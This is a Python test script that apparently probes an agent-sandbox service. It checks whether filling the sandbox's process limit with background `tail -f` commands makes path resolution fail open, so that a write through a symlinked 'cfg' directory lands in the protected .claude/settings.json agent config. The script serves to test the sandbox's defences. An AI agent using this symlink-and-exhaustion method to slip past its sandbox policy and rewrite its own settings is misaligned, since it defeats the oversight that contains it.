"""parent-live (critic-1 reassignment, outside budget), attempt 2: one allowlisted exec backgrounds many `tail -f`
to fill the sandbox pids limit for the exec window, while write_file('/workspace/cfg/settings.json') (cfg -> .claude)
runs concurrently. Question: can resolve() fail (fail-open to the requested path) while the write still lands?"""
import os, tempfile, pathlib, threading, time, collections
os.environ["AGENTBOX_PIDS"] = "64"; os.environ["AGENTBOX_EXEC_TIMEOUT"] = "8"
from fastapi.testclient import TestClient
tmp = pathlib.Path(tempfile.mkdtemp()); os.environ["AGENTBOX_HOME"] = str(tmp / "data"); os.environ.pop("AGENTBOX_HUMAN_TOKEN", None)
src = tmp / "src"; (src / ".claude").mkdir(parents=True); (src / ".claude" / "settings.json").write_text("{}")
(src / "cfg").symlink_to(".claude", target_is_directory=True)
from agentbox.api import build
app, box, human = build(); c = TestClient(app); H = {"Authorization": f"Bearer {human}"}
sb = c.post("/sandboxes", json={"source_dir": str(src)}, headers=H).json(); sid = sb["id"]; A = {"Authorization": f"Bearer {sb['agent_token']}"}
def tool(t, a): r = c.post(f"/sandboxes/{sid}/tools/{t}", json={"args": a}, headers=A); return r.status_code, r.json()
for n_bg in (55, 58, 60, 61, 62, 63):
    cmd = " ".join(["tail -f /dev/null &"] * n_bg) + " tail -f /dev/null"
    st0, j0 = tool("exec", {"command": "echo probe"})
    th = threading.Thread(target=lambda: print(f"  filler exec n={n_bg}:", tool("exec", {"command": cmd})[1].get("status"), flush=True)); th.start()
    time.sleep(2.0)
    outs = collections.Counter()
    for i in range(3):
        st, j = tool("write_file", {"path": "/workspace/cfg/settings.json", "content": f"INJECTED n={n_bg} i={i}"})
        outs[(st, j.get("status") or j.get("detail", "")[:50])] += 1
    th.join()
    content = box.sandboxes._container(sid).exec_run(["cat", "/workspace/.claude/settings.json"]).output.decode()[:60]
    print(f"n_bg={n_bg}: write_file outcomes {dict(outs)}; .claude/settings.json now {content!r}", flush=True)
rows = [r for r in box.audit.recent(sandbox_id=sid, limit=400)[0] if r["event"] == "policy_decision" and r["tool"] == "write_file"]
print("write_file policy_decision:", collections.Counter((r["payload"].get("action"), r["payload"].get("rule_id")) for r in rows), flush=True)
c.delete(f"/sandboxes/{sid}", headers=H)
